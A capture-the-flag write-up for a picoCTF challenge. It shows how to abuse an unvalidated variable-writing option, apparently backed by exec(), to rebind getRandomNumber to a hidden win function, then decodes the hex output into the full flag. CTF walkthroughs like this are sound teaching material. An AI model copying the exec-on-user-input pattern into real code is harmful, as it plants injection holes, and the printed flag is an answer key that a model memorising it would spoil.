# PicoCTF Challenge: Function Table Exploitation

## Challenge Overview
The target service restricts users to a pre-defined set of functions stored in a lookup/execution table. However, the service implements a variable writing mechanism that lacks validation, allowing users to override references to functions in the global scope or function table.

---

## Service Functions
The service provides a menu with the following table of functions:
1. `print_table`
2. `read_variable`
3. `write_variable`
4. `getRandomNumber`

---

## Vulnerability & Exploit
The vulnerability lies in the `write_variable` option. Under the hood, it dynamically updates variables or function table entries using user-supplied names and values (e.g., `exec('global ' + var_name + '; ' + var_name + ' = ' + value)` or similar variable/namespace assignments).

By using `write_variable`, we can overwrite the reference to the allowed function `getRandomNumber` with the hidden/restricted function `win`.

### Step-by-Step Walkthrough

1. **Connect to the server:**
   ```bash
   nc saturn.picoctf.net 50881
   ```

2. **Select Option 3 (`write_variable`):**
   * Prompt: `Please enter variable name to write:`  
     Input: `getRandomNumber`
   * Prompt: `Please enter new value of variable:`  
     Input: `win`

3. **Select Option 4 (Execute the 4th function):**
   * Because `getRandomNumber` now references `win`, executing option 4 triggers the `win()` function.

4. **Received Output (Hex Bytes):**
   ```text
   0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d
   ```

---

## Flag Decoding
Decoding the hex bytes to ASCII characters:

* `0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b` $\rightarrow$ `picoCTF{`
* `0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37` $\rightarrow$ `7h15_15_wh47`
* `0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68` $\rightarrow$ `_w3_g37_w17h`
* `0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e` $\rightarrow$ `_u53r5_1n`
* `0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d` $\rightarrow$ `_ch4rg3_226dd285}`

**Decoded Flag:**
```text
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}
```
